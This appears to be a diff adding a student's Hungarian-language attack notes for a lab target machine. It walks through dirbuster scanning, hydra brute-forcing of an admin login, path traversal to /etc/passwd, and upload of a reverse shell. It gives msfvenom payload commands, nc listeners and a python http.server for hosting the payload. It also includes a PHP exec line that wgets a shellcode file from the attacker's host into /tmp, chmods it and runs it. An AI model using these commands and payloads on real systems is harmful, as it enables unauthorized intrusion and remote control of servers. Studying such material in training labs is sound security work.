@@ -1,0 +1,96 @@
+GEPATTACK2
+
+40.0.3.11 celpontip
+
+http cats
+cmd:
+
+dirbuster
+
+-url kitoltes
+-szolista: (/usr/share/wordlists/dirb/common.txt)
+
+admin oldalt hydraval feltorni (elozo txtbe)
+
+dirbusteren belul:
+options - advanced options: login/auth
+
+
+file traversal
+linkes helyen hoverelni az egeret 
+filename=/etc/passwd
+oldalak: list of filenames to loot
+
+
+unrestricted file upload:
+reverse shell feltoltes
+
+//infinite logins weboldal: msfvenom cheatsheet keresobe
+php reverse shell kod -> program a gepen: msfvenom:
+
+Meterpreter - Non-Meterpreter
+ha netcat: akkor non-meterpreter-t lehet csak hasznalni
+meterpreter: meterpreter listener
+
+staged-stageless payload
+
+stageless: ez jo
+staged: netcattel nem lehet, kulon listener kell neki (meterpreter)
+
+pl Non-Meterpreter: php
+
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw
+
+LHOST: sajat ip cimunk amivel tamadunk : LHOST=30.0.... LPORT=4444
+feltolteni a fajlt
+nc -lvp 4444
+
+
+valid stuff
+(valahogy: az admin oldalról a feltoltos dolog)
+Ha valahogy elerek a celponton remote code executiont
+1. Tamado gepen: shellkódot készítünk: celpont gep oprendszere "64 bites Linux" mindig
+   LHOST sajat ip, LPORT sajat port
+
+2. Tamado gepen terminal 1 be ugyanugy: letolthetove tenni a shell kódot:
+	python3 -m http.server <port> (alapbol 8000)
+
+3. Tamado gepen: listener-t keszitek az LPORT on (amit megadtam elobb az 1.ben)
+	nc -lvp port
+
+4. Celponton: Kódfuttatás
+	1. belepunk a /tmp mappaba : barmilyen fajl lefut
+	2. rm -f /tmp/fajlnev.php
+	3. letoltjuk a shellkodot: wget http://tamadoip:serverportja
+	4. jogosultsag: chmod 777 /tmp/shellkodneve
+	5. futtatas: /tmp/shellkodneve
+
+
+googlebe:
+php exec -> manual
+
+legelso példát copy pastelni de ittvan:
+
+vscode-ba:
+elmenteni php-kent
+
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+exec('cd /tmp;rm -f /tmp/shellkodneve;wget http://ip:portaltalaba8000/shellkodneve;chmod 777 /tmp/shellkodneve;/tmp/shellkodneve', $output, $result_code);
+echo "Returned with status $result_code and output:\n";
+print_r($output);
+?>
+
+feltolteni webre
+
+
+Terminal1:
+shellkodot készítünk a cheatsheatbol:
+		stageless (nem meterpreter) x64 Linux elfes kimasolni majd elore!!:
+		msfvenom -p linux/64/shell reverse tcp LHOST=sajatip LPORT=4444 -f elf > shellkodneve
+		python3 -m http.server 8000
+
+Terminal2:
+	listener: nc -lvp 4444
+	amint megy ranyomok az oldalon
